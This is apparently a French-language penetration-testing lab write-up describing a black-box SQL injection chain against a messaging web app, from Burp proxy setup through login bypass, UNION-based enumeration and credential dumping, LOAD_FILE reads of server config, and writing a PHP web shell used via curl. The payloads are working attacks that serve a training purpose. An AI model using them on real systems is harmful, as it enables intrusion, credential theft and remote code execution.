# Lab - Exploitation complete d'une SQLi

## Scenario

Une application web de messagerie est a auditer en approche boite noire. Aucune information n'est fournie en dehors de l'adresse IP. L'objectif est de trouver et exploiter des vulnerabilites d'injection SQL pour extraire des donnees sensibles, identifier le chemin de l'application sur le serveur, et obtenir une execution de code a distance.

L'application utilise HTTPS. Il faut configurer un proxy (Burp Suite) pour intercepter le trafic.

## Approche

1. **Reconnaissance** : explorer l'application, identifier les formulaires et points d'entree
2. **Detection** : tester les champs de saisie avec des caracteres speciaux (`'`, `"`, `)`)
3. **Bypass d'authentification** : contourner le login si vulnerable
4. **Enumeration** : trouver les bases, tables et colonnes via INFORMATION_SCHEMA
5. **Extraction** : dumper les donnees sensibles (credentials, hashes)
6. **Lecture de fichiers** : verifier les privileges FILE, lire la configuration du serveur
7. **Ecriture de fichiers** : ecrire un web shell pour obtenir l'execution de commandes

## Commandes

### Configuration du proxy HTTPS

{% tabs %}
{% tab title="Navigateur integre Burp" %}
Dans Burp Suite, onglet Proxy, cliquer sur "Open browser". Le navigateur Chromium integre gere automatiquement le certificat CA de Burp.
{% endtab %}

{% tab title="Firefox + certificat CA" %}
1. Naviguer vers `http://burpsuite` apres avoir configure le proxy
2. Telecharger `cacert.der`
3. Firefox > Preferences > Certificats > Importer dans les Autorites
4. Utiliser FoxyProxy pour basculer rapidement entre proxy Burp et connexion directe
{% endtab %}
{% endtabs %}

### Bypass d'authentification

Si le formulaire d'inscription a un champ vulnerable (ex: code d'invitation) :

```sql
' OR '1'='1'-- -
```

### Enumeration via UNION injection

```sql
-- Trouver le nombre de colonnes
' ORDER BY 5-- -    -- Si erreur : 4 colonnes

-- Identifier les colonnes visibles
' UNION SELECT 1,2,3,4-- -

-- Lister les bases
') UNION SELECT 1,2,SCHEMA_NAME,4 FROM INFORMATION_SCHEMA.SCHEMATA-- -

-- Tables d'une base
') UNION SELECT 1,2,TABLE_NAME,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='base'-- -

-- Colonnes d'une table
') UNION SELECT 1,2,COLUMN_NAME,TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='Users'-- -

-- Extraire les credentials
') UNION SELECT 1,2,username,password FROM base.Users-- -
```

### Lecture de fichiers

```sql
-- Verifier les privileges
') UNION SELECT 1,2,user(),4-- -
') UNION SELECT 1,2,grantee,privilege_type FROM information_schema.user_privileges-- -

-- Trouver le webroot via la config du serveur
') UNION SELECT 1,2,3,LOAD_FILE('/etc/nginx/sites-available/default')-- -
```

### Ecriture d'un web shell

```sql
') UNION SELECT "","","","<?php system($_REQUEST['cmd']); ?>" INTO OUTFILE '/chemin/webroot/shell.php'-- -
```

### Execution de commandes

```bash
# Tester
curl -k "https://<IP_CIBLE>/shell.php?cmd=id"

# Lister les fichiers
curl -k "https://<IP_CIBLE>/shell.php?cmd=ls+/"

# Lire le fichier cible
curl -k "https://<IP_CIBLE>/shell.php?cmd=cat+/chemin/flag.txt"
```

## Ce qu'on en retient

- L'approche boite noire demande une reconnaissance methodique. Chaque formulaire, chaque champ, chaque parametre d'URL est un point d'entree potentiel.
- La SQLi peut se trouver ailleurs que dans le login : champs de recherche, filtres, formulaires d'inscription. Tester tous les points d'entree.
- L'interception HTTPS avec Burp Suite est indispensable pour voir et modifier les requetes. Sans proxy, on travaille en aveugle.
- La chaine d'exploitation SQLi vers RCE (injection -> enumeration -> lecture fichiers -> ecriture web shell -> commandes) est un classique du pentest web. Chaque etape doit etre documentee avec les payloads exacts et les resultats obtenus.
- Les parentheses dans les requetes d'origine obligent a adapter les payloads. Observer les messages d'erreur pour deduire la structure de la requete.
- Toujours nettoyer les fichiers crees (web shell) en fin de test ou les signaler explicitement au client.

***
